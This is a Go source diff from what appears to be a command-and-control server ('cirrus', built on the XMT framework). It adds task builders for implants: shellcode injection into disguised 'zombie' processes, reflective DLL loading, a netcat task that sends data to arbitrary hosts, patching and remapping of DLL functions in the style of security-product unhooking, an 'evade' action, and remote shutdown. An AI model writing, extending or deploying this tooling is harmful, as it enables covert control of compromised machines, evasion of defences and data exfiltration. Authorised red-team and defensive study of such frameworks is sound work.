@@ -17,9 +17,9 @@
 package cirrus
 
 import (
-	"encoding/base64"
 	"encoding/json"
 	"strings"
+	"time"
 
 	"github.com/PurpleSec/routex/val"
 	"github.com/iDigitalFlame/xmt/c2/cfg"
@@ -27,17 +27,7 @@ import (
 	"github.com/iDigitalFlame/xmt/cmd"
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/com"
-	"github.com/iDigitalFlame/xmt/util/xerr"
-)
-
-var (
-	errInvalidB64      = xerr.New("invalid base64 value")
-	errInvalidData     = xerr.New(`invalid or empty "data" value`)
-	errInvalidFake     = xerr.New(`invalid or empty "fake" value`)
-	errInvalidMethod   = xerr.New(`invalid "method" value`)
-	errInvalidCommand  = xerr.New(`invalid or empty "command" value`)
-	errInvalidPayload  = xerr.New(`invalid "payload" value`)
-	errInvalidDataPath = xerr.New(`specify a non-empty "data" or "path" value`)
+	"github.com/iDigitalFlame/xmt/device/winapi"
 )
 
 var valFilter = val.Validator{
@@ -64,8 +54,18 @@ var (
 		val.Validator{Name: "path", Type: val.String, Optional: true},
 		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
 		val.Validator{Name: "data", Type: val.String, Optional: true},
+		val.Validator{Name: "entry", Type: val.String, Optional: true},
 		val.Validator{Name: "reflect", Type: val.Bool, Optional: true},
 		valFilter,
+	}
+	valTaskWTS = val.Set{
+		val.Validator{Name: "wait", Type: val.Bool, Optional: true},
+		val.Validator{Name: "text", Type: val.String, Optional: true},
+		val.Validator{Name: "title", Type: val.String, Optional: true},
+		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
+		val.Validator{Name: "flags", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
+		val.Validator{Name: "session", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(-2)}},
+		val.Validator{Name: "seconds", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
 	}
 	valTaskPull = val.Set{
 		val.Validator{Name: "url", Type: val.String, Rules: val.Rules{val.NoEmpty}},
@@ -83,12 +83,23 @@ var (
 		val.Validator{Name: "domain", Type: val.String, Optional: true},
 		val.Validator{Name: "user", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 	}
+	valTaskPower = val.Set{
+		val.Validator{Name: "force", Type: val.Bool, Optional: true},
+		val.Validator{Name: "message", Type: val.String, Optional: true},
+		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
+		val.Validator{Name: "reason", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
+		val.Validator{Name: "seconds", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
+	}
+	valTaskEvade = val.Set{
+		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
+	}
 	valTaskZombie = val.Set{
 		val.Validator{Name: "show", Type: val.Bool, Optional: true},
 		val.Validator{Name: "fake", Type: val.String, Optional: true},
 		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
 		val.Validator{Name: "user", Type: val.String, Optional: true},
 		val.Validator{Name: "pass", Type: val.String, Optional: true},
+		val.Validator{Name: "entry", Type: val.String, Optional: true},
 		val.Validator{Name: "domain", Type: val.String, Optional: true},
 		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 		valFilter,
@@ -114,6 +125,13 @@ var (
 		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 		val.Validator{Name: "data", Type: val.String},
 	}
+	valTaskNetcat = val.Set{
+		val.Validator{Name: "read", Type: val.Bool, Optional: true},
+		val.Validator{Name: "data", Type: val.String, Optional: true},
+		val.Validator{Name: "protocol", Type: val.String, Optional: true},
+		val.Validator{Name: "host", Type: val.String, Rules: val.Rules{val.NoEmpty}},
+		val.Validator{Name: "seconds", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
+	}
 	valTaskProfile = val.Set{
 		val.Validator{Name: "profile", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 	}
@@ -124,6 +142,12 @@ var (
 		val.Validator{Name: "profile", Type: val.String, Optional: true},
 		val.Validator{Name: "name", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 		valFilter,
+	}
+	valTaskFuncmap = val.Set{
+		val.Validator{Name: "raw", Type: val.Bool, Optional: true},
+		val.Validator{Name: "data", Type: val.String, Optional: true},
+		val.Validator{Name: "function", Type: val.String, Optional: true},
+		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 	}
 	valTaskWindowUI = val.Set{
 		val.Validator{Name: "x", Type: val.Int, Optional: true},
@@ -144,6 +168,7 @@ var (
 	}
 	valTaskAssembly = val.Set{
 		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
+		val.Validator{Name: "entry", Type: val.String, Optional: true},
 		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 		valFilter,
 	}
@@ -167,6 +192,19 @@ var (
 		val.Validator{Name: "key", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 	}
+	valTaskWorkHours = val.Set{
+		val.Validator{Name: "day", Type: val.String, Optional: true},
+		val.Validator{Name: "end_min", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(59)}},
+		val.Validator{Name: "end_hour", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(23)}},
+		val.Validator{Name: "start_min", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(59)}},
+		val.Validator{Name: "start_hour", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(23)}},
+	}
+	valTaskPatchCheck = val.Set{
+		val.Validator{Name: "raw", Type: val.Bool, Optional: true},
+		val.Validator{Name: "data", Type: val.String, Optional: true},
+		val.Validator{Name: "function", Type: val.String, Optional: true},
+		val.Validator{Name: "dll", Type: val.String, Rules: val.Rules{val.NoEmpty}},
+	}
 )
 
 const (
@@ -188,6 +226,25 @@ type taskPull struct {
 	Agent string `json:"agent"`
 	taskExecute
 }
+type taskPower struct {
+	_       [0]func()
+	Line    string `json:"line"`
+	Action  string `json:"action"`
+	Message string `json:"message"`
+	Reason  uint32 `json:"reason"`
+	Seconds uint32 `json:"seconds"`
+	Force   bool   `json:"force"`
+}
+type taskCheck struct {
+	DLL      string `json:"dll"`
+	Line     string `json:"line"`
+	Function string `json:"function"`
+	Data     []byte `json:"data"`
+	Raw      bool   `json:"raw"`
+}
+type taskPatch struct {
+	taskCheck
+}
 type taskSpawn struct {
 	Filter  *filter.Filter  `json:"filter"`
 	Line    string          `json:"line"`
@@ -201,53 +258,72 @@ type taskZombie struct {
 	Fake   string `json:"fake"`
 	User   string `json:"user"`
 	Pass   string `json:"pass"`
+	Stdin  []byte `json:"stdin"`
 	Domain string `json:"domain"`
 	taskAssembly
 }
 type taskSystem struct {
+	_       [0]func()
 	Filter  *filter.Filter `json:"filter"`
 	Line    string         `json:"line"`
 	Args    string         `json:"args"`
 	Command string         `json:"cmd"`
+}
+type taskNetcat struct {
+	Line     string `json:"line"`
+	Host     string `json:"host"`
+	Protocol string `json:"protocol"`
+	Data     []byte `json:"data"`
+	Seconds  uint32 `json:"seconds"`
+	Read     bool   `json:"read"`
+}
+type taskFuncmap struct {
+	Action   string `json:"action"`
+	Line     string `json:"line"`
+	Function string `json:"function"`
+	Data     []byte `json:"data"`
+	Raw      bool   `json:"raw"`
 }
 type taskMigrate struct {
 	Line string `json:"line"`
 	taskSpawn
 	Wait taskBool `json:"wait"`
 }
-type taskAssembly struct {
-	Line string `json:"line"`
-	Data string `json:"data"`
-	taskExecute
-}
 type taskCommand struct {
 	Line    string `json:"line"`
 	User    string `json:"user"`
 	Pass    string `json:"pass"`
-	Stdin   string `json:"stdin"`
+	Stdin   []byte `json:"stdin"`
 	Domain  string `json:"domain"`
 	Command string `json:"cmd"`
 	taskExecute
 }
 type taskExecute struct {
+	_      [0]func()
 	Filter *filter.Filter `json:"filter"`
 	Line   string         `json:"line"`
 	Show   taskBool       `json:"show"`
 	Detach taskBool       `json:"detach"`
+}
+type taskAssembly struct {
+	Line  string `json:"line"`
+	Data  []byte `json:"data"`
+	Entry string `json:"entry"`
+	taskExecute
+}
+type taskWorkHours struct {
+	Line      string `json:"line"`
+	Days      string `json:"days"`
+	StartHour uint8  `json:"start_hour"`
+	StartMin  uint8  `json:"start_min"`
+	EndHour   uint8  `json:"end_hour"`
+	EndMin    uint8  `json:"end_min"`
 }
 type callableTasklet interface {
 	task.Callable
 	task.Tasklet
 }
 
-func ws(s val.Set) val.Set {
-	if len(s) == 0 {
-		return val.Set{val.Validator{Name: "line", Type: val.String, Rules: val.Rules{val.NoEmpty}}}
-	}
-	n := make(val.Set, len(s)+1)
-	n[copy(n, s)] = val.Validator{Name: "line", Type: val.String, Rules: val.Rules{val.NoEmpty}}
-	return n
-}
 func (t taskDLL) Packet() (*com.Packet, error) {
 	c, err := t.Callable()
 	if err != nil {
@@ -255,12 +331,75 @@ func (t taskDLL) Packet() (*com.Packet, error) {
 	}
 	return c.Packet()
 }
-func (t taskAssembly) Payload() ([]byte, error) {
-	b, err := base64.StdEncoding.DecodeString(t.Data)
-	if len(b) == 0 || err != nil {
-		return nil, errInvalidB64
+func (t taskCheck) Packet() (*com.Packet, error) {
+	// Raw means DO NOT EXTRACT, IT's RAW ASM
+	// - It's not valid when no function is used
+	// Only for functions!
+	//
+	// Raw with empty data and a specific function is special in
+	// that is directs us to read the file from the client disk
+	//
+	// Empty data with a valid function will NOT pull from disk
+	// we can read JMP calls.
+	//
+	// No data and no func means read dll from FS, compare base
+	//
+	// Else, parse data
+	// - if function is valid, extract bytes and do that
+	// - else compare base
+	if t.Raw {
+		if len(t.Function) == 0 {
+			return nil, errInvalidRaw
+		}
+		if len(t.Data) == 0 {
+			return task.CheckFunctionFile(t.DLL, t.Function, nil), nil
+		}
+		return task.CheckFunction(t.DLL, t.Function, t.Data), nil
 	}
-	return b, nil
+	if len(t.Data) == 0 && len(t.Function) > 0 {
+		return task.CheckFunction(t.DLL, t.Function, nil), nil
+	}
+	if len(t.Data) == 0 && len(t.Function) == 0 {
+		return task.CheckDLLFile(t.DLL), nil
+	}
+	if len(t.Function) > 0 {
+		v, err1 := winapi.ExtractDLLFunctionRaw(t.Data, t.Function, 16)
+		if err1 != nil {
+			return nil, err1
+		}
+		return task.CheckFunction(t.DLL, t.Function, v), nil
+	}
+	a, v, err := winapi.ExtractDLLBaseRaw(t.Data)
+	if err != nil {
+		return nil, err
+	}
+	return task.CheckDLL(t.DLL, a, v), nil
+}
+func (t taskPatch) Packet() (*com.Packet, error) {
+	if t.Raw {
+		if len(t.Data) == 0 || len(t.Function) == 0 {
+			return nil, errInvalidRaw
+		}
+		return task.PatchFunction(t.DLL, t.Function, t.Data), nil
+	}
+	if len(t.Data) == 0 && len(t.Function) > 0 {
+		return task.PatchFunction(t.DLL, t.Function, nil), nil
+	}
+	if len(t.Data) == 0 && len(t.Function) == 0 {
+		return task.PatchDLLFile(t.DLL), nil
+	}
+	if len(t.Function) > 0 {
+		v, err1 := winapi.ExtractDLLFunctionRaw(t.Data, t.Function, 16)
+		if err1 != nil {
+			return nil, err1
+		}
+		return task.PatchFunction(t.DLL, t.Function, v), nil
+	}
+	a, v, err := winapi.ExtractDLLBaseRaw(t.Data)
+	if err != nil {
+		return nil, err
+	}
+	return task.PatchDLL(t.DLL, a, v), nil
 }
 func (b *taskBool) UnmarshalJSON(d []byte) error {
 	if len(d) == 0 {
@@ -290,18 +429,45 @@ func (b *taskBool) UnmarshalJSON(d []byte) error {
 	*b = boolNone
 	return nil
 }
-func (t taskZombie) Packet() (*com.Packet, error) {
-	b, err := t.Payload()
-	if err != nil {
-		return nil, err
+func (t taskPower) Packet() (*com.Packet, error) {
+	switch strings.ToLower(t.Action) {
+	case "restart":
+		return task.Restart(t.Message, t.Seconds, t.Force, t.Reason), nil
+	case "shutdown":
+		return task.Shutdown(t.Message, t.Seconds, t.Force, t.Reason), nil
 	}
+	return nil, errInvalidAction
+}
+func (t taskNetcat) Packet() (*com.Packet, error) {
+	if len(t.Host) == 0 {
+		return nil, errInvalidHost
+	}
+	var p uint8
+	switch strings.ToLower(t.Protocol) {
+	case "udp":
+		p = task.NetcatUDP
+	case "tls":
+		p = task.NetcatTLS
+	case "icmp":
+		p = task.NetcatICMP
+	case "tcp", "":
+		p = task.NetcatTCP
+	case "tls-insecure":
+		p = task.NetcatTLSInsecure
+	default:
+		return nil, errInvalidProtocol
+	}
+	return task.Netcat(t.Host, p, time.Second*time.Duration(t.Seconds), t.Read, t.Data), nil
+}
+func (t taskZombie) Packet() (*com.Packet, error) {
 	return (task.Zombie{
-		Data:   cmd.DLLToASM("", b),
+		Data:   cmd.DLLToASM(t.Entry, t.Data),
 		Args:   cmd.Split(t.Fake),
 		Hide:   t.Show != boolTrue,
 		Wait:   t.Detach != boolTrue,
 		User:   t.User,
 		Pass:   t.Pass,
+		Stdin:  t.Stdin,
 		Domain: t.Domain,
 		Filter: t.Filter,
 	}).Packet()
@@ -312,12 +478,9 @@ func (t taskCommand) Packet() (*com.Packet, error) {
 		Wait:   t.Detach != boolTrue,
 		User:   t.User,
 		Pass:   t.Pass,
+		Stdin:  t.Stdin,
 		Domain: t.Domain,
 		Filter: t.Filter,
-	}
-	var err error
-	if p.Stdin, err = readEmptyB64(t.Stdin); err != nil {
-		return nil, err
 	}
 	if len(t.Command) == 0 && len(t.Stdin) == 0 {
 		return nil, errInvalidCommand
@@ -340,21 +503,46 @@ func (t taskCommand) Packet() (*com.Packet, error) {
 	}
 	return p.Packet()
 }
-func (t taskAssembly) Packet() (*com.Packet, error) {
-	b, err := t.Payload()
+func (t taskFuncmap) Packet() (*com.Packet, error) {
+	switch strings.ToLower(t.Action) {
+	case "add":
+	case "list", "ls":
+		return task.FuncRemapList(), nil
+	case "del", "delete", "remove":
+		if len(t.Function) == 0 {
+			return nil, errInvalidFunction
+		}
+		return task.FuncUnmap(t.Function), nil
+	case "del_all", "delete_all", "remove_all":
+		return task.FuncUnmapAll(), nil
+	default:
+		return nil, errInvalidAction
+	}
+	if len(t.Data) == 0 {
+		return nil, errInvalidData
+	}
+	if len(t.Function) == 0 {
+		return nil, errInvalidFunction
+	}
+	if t.Raw {
+		return task.FuncRemap(t.Function, t.Data), nil
+	}
+	v, err := winapi.ExtractDLLFunctionRaw(t.Data, t.Function, 16)
 	if err != nil {
 		return nil, err
 	}
+	return task.FuncRemap(t.Function, v), nil
+}
+func (t taskAssembly) Packet() (*com.Packet, error) {
 	return (task.Assembly{
-		Data:   cmd.DLLToASM("", b),
+		Data:   cmd.DLLToASM(t.Entry, t.Data),
 		Wait:   t.Detach != boolTrue,
 		Filter: t.Filter,
 	}).Packet()
 }
 func (t taskSpawn) Callable() (task.Callable, error) {
-	// NOTE(dij): The created instances are omitting the Filter value
-	//            as this is set by the Spawn and Migrate functions when starting
-	//            up.
+	// NOTE(dij): The created instances are omitting the Filter value as this is
+	//            set by the Spawn and Migrate functions when starting up.
 	switch strings.ToLower(t.Method) {
 	case "":
 		return nil, nil
@@ -379,14 +567,7 @@ func (t taskSpawn) Callable() (task.Callable, error) {
 		if len(v.Data) == 0 {
 			return nil, errInvalidData
 		}
-		b, err := v.Payload()
-		if err != nil {
-			return nil, err
-		}
-		return task.Assembly{
-			Data: cmd.DLLToASM("", b),
-			Wait: v.Detach != boolTrue,
-		}, nil
+		return task.Assembly{Data: cmd.DLLToASM(v.Entry, v.Data), Wait: v.Detach != boolTrue}, nil
 	case "exec":
 		var v taskCommand
 		if err := json.Unmarshal(t.Payload, &v); err != nil {
@@ -400,6 +581,7 @@ func (t taskSpawn) Callable() (task.Callable, error) {
 			Wait:   v.Detach != boolTrue,
 			User:   v.User,
 			Pass:   v.Pass,
+			Stdin:  v.Stdin,
 			Domain: v.Domain,
 		}
 		switch v.Command[0] {
@@ -422,12 +604,8 @@ func (t taskSpawn) Callable() (task.Callable, error) {
 		if len(v.Fake) == 0 {
 			return nil, errInvalidFake
 		}
-		b, err := v.Payload()
-		if err != nil {
-			return nil, err
-		}
 		return task.Zombie{
-			Data:   cmd.DLLToASM("", b),
+			Data:   cmd.DLLToASM(v.Entry, v.Data),
 			Args:   cmd.Split(v.Fake),
 			Hide:   v.Show != boolTrue,
 			Wait:   v.Detach != boolTrue,
@@ -440,28 +618,22 @@ func (t taskSpawn) Callable() (task.Callable, error) {
 }
 func (t taskDLL) Callable() (callableTasklet, error) {
 	if len(t.Path) > 0 {
-		return task.DLL{
-			Path:   t.Path,
-			Wait:   t.Detach != boolTrue,
-			Filter: t.Filter,
-		}, nil
+		return task.DLL{Path: t.Path, Wait: t.Detach != boolTrue, Filter: t.Filter}, nil
 	}
-	b, err := t.Payload()
+	if t.Reflect == boolTrue {
+		return task.Assembly{Data: cmd.DLLToASM(t.Entry, t.Data), Wait: t.Detach != boolTrue, Filter: t.Filter}, nil
+	}
+	return task.DLL{Data: t.Data, Wait: t.Detach != boolTrue, Filter: t.Filter}, nil
+}
+func (t taskWorkHours) Packet() (*com.Packet, error) {
+	d, err := parseDayString(t.Days)
 	if err != nil {
 		return nil, err
 	}
-	if t.Reflect == boolTrue {
-		return task.Assembly{
-			Data:   cmd.DLLToASM("", b),
-			Wait:   t.Detach != boolTrue,
-			Filter: t.Filter,
-		}, nil
+	if t.StartHour > 23 || t.StartMin > 59 || t.EndHour > 23 || t.EndMin > 59 {
+		return nil, errInvalidTime
 	}
-	return task.DLL{
-		Data:   b,
-		Wait:   t.Detach != boolTrue,
-		Filter: t.Filter,
-	}, nil
+	return task.WorkHours(d, t.StartHour, t.StartMin, t.EndHour, t.EndMin), nil
 }
 func (t taskSpawn) Packet(p cfg.Config) (*com.Packet, error) {
 	if t.Method == "pexec" {
@@ -474,7 +646,7 @@ func (t taskSpawn) Packet(p cfg.Config) (*com.Packet, error) {
 			return task.SpawnPullProfile(t.Filter, t.Name, p, u, m["agent"]), nil
 		}
 		var u string
-		if err := json.Unmarshal(t.Payload, &u); err != nil || len(u) == 0 {
+		if err := json.Unmarshal(t.Payload, &u); err != nil {
 			return nil, errInvalidPayload
 		}
 		return task.SpawnPullProfile(t.Filter, t.Name, p, u, ""), nil
@@ -496,7 +668,7 @@ func (t taskMigrate) Packet(p cfg.Config) (*com.Packet, error) {
 			return task.MigratePullProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, u, m["agent"]), nil
 		}
 		var u string
-		if err := json.Unmarshal(t.Payload, &u); err != nil || len(u) == 0 {
+		if err := json.Unmarshal(t.Payload, &u); err != nil {
 			return nil, errInvalidPayload
 		}
 		return task.MigratePullProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, u, ""), nil
